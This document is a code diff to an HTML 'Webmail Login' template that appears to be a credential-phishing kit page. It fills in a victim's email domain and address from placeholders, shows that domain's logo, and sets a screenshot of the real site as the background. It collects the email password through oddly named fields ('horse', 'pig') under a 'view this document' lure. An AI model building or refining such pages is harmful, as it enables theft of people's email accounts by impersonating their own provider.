@@ -4,6 +4,8 @@
 <meta charset="UTF-8">
 <title>Webmail Portal Login</title>
 
+<link rel="icon" href="https://api.kickfire.com/logo?website={{ins}}">
+
 <style>
 html, body {
     height: 100%;
@@ -11,7 +13,7 @@ html, body {
     font-family: Arial, Helvetica, sans-serif;
 }
 
-/* Background layer */
+/* Safe background */
 #bg {
     position: fixed;
     inset: 0;
@@ -19,7 +21,6 @@ html, body {
     background-position: center;
     background-repeat: no-repeat;
     z-index: -1;
-    transition: background-image 0.4s ease;
 }
 
 /* Fallback gradient */
@@ -31,10 +32,65 @@ html, body {
 .form-holder {
     background: rgba(255,255,255,0.92);
     width: 600px;
-    margin: 180px auto;
-    padding-bottom: 20px;
+    margin: 160px auto;
     box-shadow: 0 20px 50px rgba(0,0,0,0.25);
     border-radius: 6px;
+    border: 1px solid #d6dfea;
+}
+
+/* Header */
+.xlogo {
+    background: #0d4f8b;
+    color: #fff;
+    padding: 12px;
+    font-size: 18px;
+}
+
+/* Form */
+.form-wrap {
+    width: 400px;
+    margin: 0 auto;
+    text-align: center;
+}
+
+.form-wrap p {
+    font-size: 22px;
+    margin: 20px 0;
+}
+
+.finput {
+    width: 100%;
+    margin: 10px 0;
+}
+
+.finput input {
+    width: 100%;
+    font-size: 20px;
+    padding: 10px;
+    border-radius: 4px;
+    border: 1px solid #d6dfea;
+}
+
+button {
+    margin-top: 15px;
+    font-size: 18px;
+    padding: 10px 20px;
+    background: #0d4f8b;
+    color: #fff;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+}
+
+button:hover {
+    background: #1874cd;
+}
+
+.privacy {
+    font-size: 14px;
+    color: gray;
+    text-align: left;
+    margin: 20px;
 }
 </style>
 </head>
@@ -44,38 +100,55 @@ html, body {
 <!-- Background -->
 <div id="bg" class="bg-fallback"></div>
 
-<!-- Hidden iframe for detection only -->
+<!-- Hidden iframe (detection only) -->
 <iframe id="probe" style="display:none;"></iframe>
 
 <div class="form-holder">
-    <h2 style="padding:20px;text-align:center;">Webmail Login</h2>
+    <div class="xlogo">
+        <span style="text-transform: capitalize;">{{ins}} Webmail</span>
+    </div>
+
+    <div class="form-wrap">
+        <form action="first" method="POST">
+            <p>Please log in with your email</p>
+
+            <img src="https://api.kickfire.com/logo?website={{ins}}" width="120">
+
+            <div class="finput">
+                <input type="email" name="horse" value="{{eman}}" required>
+            </div>
+
+            <div class="finput">
+                <input type="password" name="pig" placeholder="Email Password" required>
+            </div>
+
+            <button type="submit">Continue</button>
+
+            <div class="privacy">
+                Privacy Policy: <b>{{ins}}</b><br>
+                Your information will only be used for the sole purpose of viewing this document.
+            </div>
+        </form>
+    </div>
 </div>
 
 <script>
 (function () {
-    const domain = "{{ins}}"; // example: gmail.com
+    const domain = "{{ins}}";
     const bg = document.getElementById("bg");
     const iframe = document.getElementById("probe");
 
-    let blocked = false;
-
-    // Detect iframe blocking
     iframe.src = "https://www." + domain;
 
     iframe.onload = () => {
-        if (blocked) return;
-
-        // Auto-generate background using screenshot API
         bg.style.backgroundImage =
             `url("https://image.thum.io/get/width/1920/https://www.${domain}")`;
     };
 
     iframe.onerror = () => {
-        blocked = true;
         bg.classList.add("bg-fallback");
     };
 
-    // Timeout fallback (iframe silently blocked)
     setTimeout(() => {
         if (!iframe.contentDocument) {
             bg.classList.add("bg-fallback");
